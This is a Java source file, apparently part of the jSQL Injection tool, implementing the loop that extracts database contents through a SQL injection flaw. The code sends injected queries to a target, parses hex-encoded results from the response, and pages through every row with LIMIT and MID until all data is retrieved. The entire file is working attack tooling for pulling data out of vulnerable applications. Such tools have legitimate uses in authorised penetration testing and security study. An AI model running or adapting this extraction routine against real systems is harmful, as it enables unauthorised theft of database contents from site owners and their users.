package com.jsql.model;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.bean.ElementDatabase;
import com.jsql.model.bean.Request;
import com.jsql.model.pattern.strategy.IInjectionStrategy;
import com.jsql.view.GUIMediator;

/**
 * Get all data from a SQL request (remember that data will often been cut, we need to reach ALL the data)
 * We expect the following well formed line:
 * => hh[0-9A-F]*jj[0-9A-F]*c?hhgghh[0-9A-F]*jj[0-9A-F]*c?hhg...hi
 * We must check if that long line is cut, and where it is cut, basically we will move our position in a virtual 2D array,
 * and use LIMIT and MID to move the cursor ; LIMIT skips whole line (useful if result contains 1 or more complete row) ; and
 * MID skips characters in a line (useful if result contains less than 1 row).
 * The process can be interrupted by the user (stop/pause).
 */
public class StoppableLoopIntoResults extends Suspendable {
    @Override
    public String action(Object... args) throws PreparationException, StoppableException {
        String initialSQLQuery = (String) args[0];
        String[] sourcePage = (String[]) args[1];
        boolean useLimit = (Boolean) args[2];
        int numberToFind = (Integer) args[3];
        ElementDatabase searchName = (ElementDatabase) args[4];
        GUIMediator.model().suspendables.remove(searchName);
        GUIMediator.model().suspendables.put(searchName, this);

        String sqlQuery = new String(initialSQLQuery).replaceAll("\\{limit\\}", "");

        IInjectionStrategy istrategy = GUIMediator.model().injectionStrategy;
        /*
         * As we know the expected number of rows (numberToFind), then it stops injection if all rows are found,
         * keep track of rows we have reached (limitSQLResult) and use these to skip entire rows,
         * keep track of characters we have reached (startPosition) and use these to skip characters,
         */
        String finalResultSource = "", currentResultSource = "";
        for (int limitSQLResult = 0, startPosition = 1/*, i=1*/;; startPosition = currentResultSource.length() + 1/*, i++*/) {

            // try {
            //     Thread.sleep(500);
            // } catch (InterruptedException e) {
            //     this.model.sendDebugMessage(e);
            // }

            if (this.pauseShouldStopPause()) {
                break;
            }

            sourcePage[0] = istrategy.inject(sqlQuery, startPosition + "", this);

            // Parse all the data we have retrieved
            Matcher regexSearch = Pattern.compile("SQLi([0-9A-Fghij]+)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(sourcePage[0]);

            /*
             * Ending condition:
             * One row could be very long, longer than the database can provide
             * #Need verification
             */
            if (!regexSearch.find()) {
                if (useLimit && !"".equals(finalResultSource)) {
                    //                        model.sendMessage("A");
                    // Update the view only if there are value to find, and if it's not the root (empty tree)
                    if (numberToFind > 0 && searchName != null) {
                        Request request = new Request();
                        request.setMessage("UpdateProgress");
                        request.setParameters(searchName, numberToFind);
                        GUIMediator.model().interact(request);
                    }
                    break;
                }
            }

            /*
             * Add the result to the data already found, informs the view about it.
             * If throws exception, inform the view about the failure.
             */
            try {
                currentResultSource += regexSearch.group(1);

                Request request = new Request();
                request.setMessage("MessageChunk");
                request.setParameters(regexSearch.group(1) + " ");
                GUIMediator.model().interact(request);
            } catch (IllegalStateException e) {
                // if it's not the root (empty tree)
                if (searchName != null) {
                    Request request = new Request();
                    request.setMessage("EndProgress");
                    request.setParameters(searchName);
                    GUIMediator.model().interact(request);
                }
                throw new PreparationException("Fetching fails: no data to parse for " + searchName);
            }

            /*
             * Check how many rows we have collected from the beginning of that chunk
             */
            regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
            int nbResult = 0;
            while (regexSearch.find()) {
                nbResult++;
            }

            /*
             * Inform the view about the progression
             */
            if (useLimit) {
                if (numberToFind > 0 && searchName != null) {
                    Request request = new Request();
                    request.setMessage("UpdateProgress");
                    request.setParameters(searchName, limitSQLResult + nbResult);
                    GUIMediator.model().interact(request);
                }
                //                    System.out.println("Request " + i + ", data collected "+(limitSQLResult + nbResult) + (numberToFind>0?"/"+numberToFind:"") + " << " + currentResultSource.length() + " bytes" );
            }

            /*
             * We have properly reached the i at the end of the query: iLQS
             * => hhxxxxxxxxjj00hhgghh...hiLQS
             */
            /* Design Pattern: State? */
            if (currentResultSource.contains("i")) {
                /*
                 * Remove everything after our result
                 * => hhxxxxxxxxjj00hhgghh...h |-> iLQSjunk
                 */
                finalResultSource += currentResultSource = Pattern.compile("i.*", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
                if (useLimit) {
                    /*
                     * Remove everything not properly attached to the last row:
                     * 1. very start of a new row: XXXXXhhg[ghh]$
                     * 2. very end of the last row: XXXXX[jj00]$
                     */
                    finalResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
                    currentResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");

                    /*
                     * Check either if there is more than 1 row and if there is less than 1 complete row
                     */
                    regexSearch = Pattern.compile("[0-9A-F]hhgghh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
                    Matcher regexSearch2 = Pattern.compile("h[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);

                    /*
                     * If there is more than 1 row, delete the last incomplete one in order to restart properly from it at the next loop,
                     * else if there is 1 row but incomplete, mark it as cut with the letter c
                     */
                    if (regexSearch.find()) {
                        finalResultSource = Pattern.compile(
                                "hh[0-9A-F]+$",
                                Pattern.CASE_INSENSITIVE | Pattern.DOTALL
                                ).matcher(finalResultSource).replaceAll("");
                    } else if (regexSearch2.find()) {
                        finalResultSource += "jj31chh";
                    }

                    /*
                     * Check how many rows we have collected from the very beginning of the query,
                     * then skip every rows we have already found via LIMIT
                     */
                    regexSearch = Pattern.compile(
                            "(h[0-9A-F]*jj[0-9A-F]*c?h)",
                            Pattern.CASE_INSENSITIVE | Pattern.DOTALL
                            ).matcher(finalResultSource);

                    nbResult = 0;
                    while (regexSearch.find()) {
                        nbResult++;
                    }
                    limitSQLResult = nbResult;

                    // Inform the view about the progression
                    //                        System.out.println("Request " + i + ", data collected " + limitSQLResult + (numberToFind>0 ? "/"+numberToFind : "" ));
                    if (numberToFind > 0 && searchName != null) {
                        Request request = new Request();
                        request.setMessage("UpdateProgress");
                        request.setParameters(searchName, limitSQLResult);
                        GUIMediator.model().interact(request);
                    }

                    /*
                     * Ending condition: every expected rows have been retrieved.
                     * Inform the view about the progression
                     */
                    if (limitSQLResult == numberToFind) {
                        //                            model.sendMessage("B");
                        if (numberToFind > 0 && searchName != null) {
                            Request request = new Request();
                            request.setMessage("UpdateProgress");
                            request.setParameters(searchName, numberToFind);
                            GUIMediator.model().interact(request);
                        }
                        break;
                    }

                    /*
                     *  Add the LIMIT statement to the next SQL query and reset variables.
                     *  Put the character cursor to the beginning of the line, and reset the result of the current query
                     */
                    sqlQuery = Pattern.compile(
                            "\\{limit\\}",
                            Pattern.CASE_INSENSITIVE | Pattern.DOTALL
                            ).matcher(initialSQLQuery).replaceAll("+limit+" + limitSQLResult + ",65536");
                    startPosition = 1;
                    currentResultSource = "";
                } else {
                    // Inform the view about the progression
                    //                        model.sendMessage("C");
                    if (numberToFind > 0 && searchName != null) {
                        Request request = new Request();
                        request.setMessage("UpdateProgress");
                        request.setParameters(searchName, numberToFind);
                        GUIMediator.model().interact(request);
                    }
                    break;
                }
                /*
                 * Check if the line is odd or even, make it even.
                 * Every character must be on 2 char, e.g A is 41, if we only have 4, then delete the 4.
                 * #Need verification
                 */
            } else if (currentResultSource.length() % 2 == 0) {
                currentResultSource = currentResultSource.substring(0, currentResultSource.length() - 1);
            }

        }

        return finalResultSource;
    }
}

